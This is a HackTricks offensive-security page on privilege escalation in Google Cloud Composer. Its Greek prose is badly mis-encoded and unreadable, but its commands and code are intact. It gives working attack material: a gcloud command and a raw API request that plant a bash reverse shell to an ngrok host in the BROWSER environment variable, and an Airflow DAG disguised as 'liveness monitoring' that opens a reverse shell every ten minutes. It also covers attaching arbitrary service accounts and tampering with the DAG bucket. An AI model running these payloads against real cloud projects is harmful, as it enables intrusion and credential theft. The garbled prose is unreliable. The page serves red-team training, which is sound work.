# GCP - Composer Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## composer

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ„Î¿:

{% content-ref url="../gcp-services/gcp-composer-enum.md" %}
[gcp-composer-enum.md](../gcp-services/gcp-composer-enum.md)
{% endcontent-ref %}

### `composer.environments.create`

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **ÏƒÏ…Î½Î´Î­ÏƒÎµÏ„Îµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚** ÏƒÏ„Î¿ Î½Î­Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ composer Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î±. Î‘ÏÎ³ÏŒÏ„ÎµÏÎ± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ composer Î³Î¹Î± Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚.
```bash
gcloud composer environments create privesc-test \
--project "${PROJECT_ID}" \
--location europe-west1 \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
```
Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· [**ÎµÎ´Ï**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/i-composer.environmets.create.sh).

### `composer.environments.update`

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ composer, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚:

{% code overflow="wrap" %}
```bash
# Even if it says you don't have enough permissions the update happens
gcloud composer environments update \
projects/<project-id>/locations/<location>/environments/<composer-env-name> \
--update-env-variables="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19990 0>&1' & #%s" \
--location <location> \
--project <project-id>

# Call the API endpoint directly
PATCH /v1/projects/<project-id>/locations/<location>/environments/<composer-env-name>?alt=json&updateMask=config.software_config.env_variables HTTP/2
Host: composer.googleapis.com
User-Agent: google-cloud-sdk gcloud/480.0.0 command/gcloud.composer.environments.update invocation-id/826970373cd441a8801d6a977deba693 environment/None environment-version/None client-os/MACOSX client-os-ver/23.4.0 client-pltf-arch/arm interactive/True from-script/False python/3.12.3 term/xterm-256color (Macintosh; Intel Mac OS X 23.4.0)
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 178
Content-Type: application/json
X-Goog-Api-Client: cred-type/sa
Authorization: Bearer [token]
X-Allowed-Locations: 0x0

{"config": {"softwareConfig": {"envVariables": {"BROWSER": "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/1890 0>&1' & #%s", "PYTHONWARNINGS": "all:0:antigravity.x:0:0"}}}}
```
{% endcode %}

TODO: Get RCE by adding new pypi packages to the environment

### ÎšÎ±Ï„Î­Î²Î±ÏƒÎ¼Î± Dags

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î¿Î½ Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ± Ï„Ï‰Î½ dags Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹:

{% code overflow="wrap" %}
```bash
mkdir /tmp/dags
gcloud composer environments storage dags export --environment <environment> --location <loc> --destination /tmp/dags
```
{% endcode %}

### Î•Î¹ÏƒÎ±Î³Ï‰Î³Î® Dags

Î ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± python DAG ÏƒÎµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Î¹ ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Î­ Ï„Î¿ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚:

{% code overflow="wrap" %}
```bash
# TODO: Create dag to get a rev shell
gcloud composer environments storage dags import --environment test --location us-central1 --source /tmp/dags/reverse_shell.py
```
{% endcode %}

DAG Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î·Ï‚ Î¸Î®ÎºÎ·Ï‚:

{% code title="reverse_shell.py" %}
```python
import airflow
from airflow import DAG
from airflow.operators.bash_operator import BashOperator
from datetime import timedelta

default_args = {
'start_date': airflow.utils.dates.days_ago(0),
'retries': 1,
'retry_delay': timedelta(minutes=5)
}

dag = DAG(
'reverse_shell',
default_args=default_args,
description='liveness monitoring dag',
schedule_interval='*/10 * * * *',
max_active_runs=1,
catchup=False,
dagrun_timeout=timedelta(minutes=10),
)

# priority_weight has type int in Airflow DB, uses the maximum.
t1 = BashOperator(
task_id='bash_rev',
bash_command='bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/14382 0>&1',
dag=dag,
depends_on_past=False,
priority_weight=2**31 - 1,
do_xcom_push=False)
```
{% endcode %}

### Î“ÏÎ¬ÏˆÏ„Îµ Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ ÎºÎ¬Î´Î¿ Composer

ÎŒÎ»Î± Ï„Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± ÎµÎ½ÏŒÏ‚ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ composer (DAGs, plugins ÎºÎ±Î¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î±) Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î±Î½ ÎºÎ¬Î´Î¿ GCP. Î•Î¬Î½ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î­Ï‡ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚ ÎºÎ±Î¹ ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÎµ Î±Ï…Ï„ÏŒÎ½, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï„Î¿Î½ ÎºÎ¬Î´Î¿ ÎºÎ±Î¹ **ÏŒÏ€Î¿Ï„Îµ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î® ÎµÎ½Î·Î¼ÎµÏÏÎ½ÎµÏ„Î±Î¹ Î­Î½Î± DAG, Î½Î± Ï…Ï€Î¿Î²Î¬Î»ÎµÎ¹ Î¼Î¹Î± Ï€Î±ÏÎ±Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î­ÎºÎ´Î¿ÏƒÎ·** ÏÏƒÏ„Îµ Ï„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ composer Î½Î± Ï€Î¬ÏÎµÎ¹ Î±Ï€ÏŒ Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· Ï„Î·Î½ Ï€Î±ÏÎ±Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î­ÎºÎ´Î¿ÏƒÎ·.

Get more info about this attack in:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

### Î•Î¹ÏƒÎ±Î³Ï‰Î³Î® Plugins

TODO: Check what is possible to compromise by uploading plugins

### Î•Î¹ÏƒÎ±Î³Ï‰Î³Î® Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½

TODO: Check what is possible to compromise by uploading data

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
